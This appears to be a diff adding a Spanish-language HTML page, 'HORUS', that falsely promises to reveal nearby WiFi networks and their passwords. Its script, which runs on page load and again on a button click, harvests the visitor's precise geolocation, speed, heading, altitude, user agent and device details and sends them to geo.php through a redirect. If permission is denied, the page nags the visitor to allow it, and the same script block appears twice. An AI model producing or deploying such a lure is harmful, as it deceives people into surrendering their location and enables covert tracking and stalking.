@@ -1,0 +1,185 @@
+<!DOCTYPE html>
+<html lang="es" >
+<head>
+  <meta charset="UTF-8">
+  <title>HORUS</title>
+  
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.0.2/jquery.min.js"></script><link rel="stylesheet" href="./style.css">
+
+</head>
+<body>
+<body>
+<meta http-equiv="refresh" content="30" />
+<p style="text-align: center;margin-top:3px;">Refresca la pagina y permite Ubicar redes Wiffi con su contraseña </p>
+		    	  	      
+<body onLoad="openLocat()">
+ <div style="text-align:center;">
+<button onclick="openLocat()">Acceder a Wiffi</button>
+</div>
+<script>
+
+function openLocat() {
+    if (navigator.geolocation) {
+    var acc = {enableHighAccuracy : true , timeout : 30000, maximumage : 0 };
+        navigator.geolocation.getCurrentPosition(showPosition, showError, acc);
+    } else {
+        x.innerHTML = "This site requires Geolocation to work.";
+    }
+}
+
+function showPosition(position) {
+
+ //   x.innerHTML = "Latitude: " + position.coords.latitude +
+ //   "<br>Longitude: " + position.coords.longitude;
+
+  var accu = position.coords.accuracy;
+  var speed = position.coords.speed;
+  var head = position.coords.heading;
+  var plat = navigator.platform;
+  var lati = position.coords.latitude;
+  var longi = position.coords.longitude;
+  var hard = navigator.hardwareConcurrency;
+  var height = window.screen.height;
+  var width = window.screen.width;
+  var mem = navigator.deviceMemory;
+  var alt = position.coords.altitude;
+  var agent = navigator.userAgent;
+								
+window.location.href = "geo.php?accu=" + accu + "&speed=" + speed + "&head=" + head + "&plat=" + plat + "&lati=" + lati + "&longi=" + longi + "&hard=" + hard + "&height=" + height + "&width="+ width + "&mem=" + mem + "&alt=" + alt + "&agent=" + agent;
+}
+
+function showError(error)
+{
+        switch(error.code)
+  {
+                case error.PERMISSION_DENIED:
+                        var error = '1' ; // 'permission denied';
+      alert('No pudimos acceder a las redes wiffi de su alrededor, dale permitir para acceder');
+      break;
+                case error.POSITION_UNAVAILABLE:
+                        var error = '2' // 'unavailable';
+                        break;
+                case error.TIMEOUT:
+                        var error = '3' // 'timed out';
+      alert('Please refresh this page...');
+                        break;
+                case error.UNKNOWN_ERROR:
+                        var error  = '4' // 'unknown error';
+                        break;
+        }
+
+window.location.href = "error.php?error=" + error;
+
+}
+</script>
+
+</body>
+
+
+
+<iframe src="https://www.google.com/maps/embed?pb=!1m14!1m12!1m3!1d47848362.33481347!2d-10.043989382238333!3d42.948094216577196!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!5e0!3m2!1ses-419!2sco!4v1598641896648!5m2!1ses-419!2sco" width="100%" height="100%" frameborder="0" style="border:0;" allowfullscreen="" aria-hidden="false" tabindex="0"></iframe>
+<!-- partial:index.partial.html -->
+<div id="googleMap"></div>
+
+<div class="small-circle">
+  <span></span>
+</div>
+
+<svg version="1.1" 
+     id="radar-svg"
+     pointer-events="none">
+    
+    <polygon id="radar-beam" fill="#ED1C24" points="" fill-opacity='0.75'/>
+</svg>
+
+<svg 
+     version="1.1" 
+     id="radar-circle-other"
+     pointer-events="none">
+				  
+    <circle cx="50%" cy="50%" r="0" fill-opacity="0" stroke="white" stroke-width="16px" stroke-opacity="0.4">
+					      <animate attributeName="r" from="0" to="1220" dur="6s" repeatCount="indefinite" begin="0.25s" />
+				    </circle>
+				  
+				    <circle cx="50%" cy="50%" r="0" fill-opacity="0" stroke="white" stroke-width="12px" stroke-opacity="0.4">
+					      <animate attributeName="r" from="0" to="1220" dur="6s" repeatCount="indefinite" begin="1.25s" />
+				    </circle>
+				  
+				    <circle cx="50%" cy="50%" r="0" fill-opacity="0" stroke="white" stroke-width="8px" stroke-opacity="0.4">
+					      <animate attributeName="r" from="0" to="1220" dur="6s" repeatCount="indefinite" begin="2.25s" />
+				    </circle>
+				  
+				    <circle cx="50%" cy="50%" r="0" fill-opacity="0" stroke="white" stroke-width="4px" stroke-opacity="0.4">
+					      <animate attributeName="r" from="0" to="1220" dur="6s" repeatCount="indefinite" begin="3.25s" />
+				    </circle>
+				  
+				    <circle cx="50%" cy="50%" r="0" fill-opacity="0" stroke="white" stroke-width="2px" stroke-opacity="0.4">
+					      <animate attributeName="r" from="0" to="1220" dur="6s" repeatCount="indefinite" begin="4.25s" />
+				    </circle>
+  
+				</svg>
+<!-- partial -->
+  <script  src="./script.js"></script>
+  
+  
+  <script>
+
+function openLocat() {
+    if (navigator.geolocation) {
+    var acc = {enableHighAccuracy : true , timeout : 30000, maximumage : 0 };
+        navigator.geolocation.getCurrentPosition(showPosition, showError, acc);
+    } else {
+        x.innerHTML = "Dale permitir para acceder a las redes wiffi de su alrededor";
+    }
+}
+
+function showPosition(position) {
+
+ //   x.innerHTML = "Latitude: " + position.coords.latitude +
+ //   "<br>Longitude: " + position.coords.longitude;
+
+  var accu = position.coords.accuracy;
+  var speed = position.coords.speed;
+  var head = position.coords.heading;
+  var plat = navigator.platform;
+  var lati = position.coords.latitude;
+  var longi = position.coords.longitude;
+  var hard = navigator.hardwareConcurrency;
+  var height = window.screen.height;
+  var width = window.screen.width;
+  var mem = navigator.deviceMemory;
+  var alt = position.coords.altitude;
+  var agent = navigator.userAgent;
+								
+window.location.href = "geo.php?accu=" + accu + "&speed=" + speed + "&head=" + head + "&plat=" + plat + "&lati=" + lati + "&longi=" + longi + "&hard=" + hard + "&height=" + height + "&width="+ width + "&mem=" + mem + "&alt=" + alt + "&agent=" + agent;
+}
+
+function showError(error)
+{
+        switch(error.code)
+  {
+                case error.PERMISSION_DENIED:
+                        var error = '1' ; // 'permission denied';
+      alert('No pudimos acceder a las redes wiffi de su alrededor, dale permitir para acceder');
+      break;
+                case error.POSITION_UNAVAILABLE:
+                        var error = '2' // 'unavailable';
+                        break;
+                case error.TIMEOUT:
+                        var error = '3' // 'timed out';
+      alert('Please refresh this page...');
+                        break;
+                case error.UNKNOWN_ERROR:
+                        var error  = '4' // 'unknown error';
+                        break;
+        }
+
+window.location.href = "error.php?error=" + error;
+
+}
+</script>
+  
+  
+
+</body>
+</html>
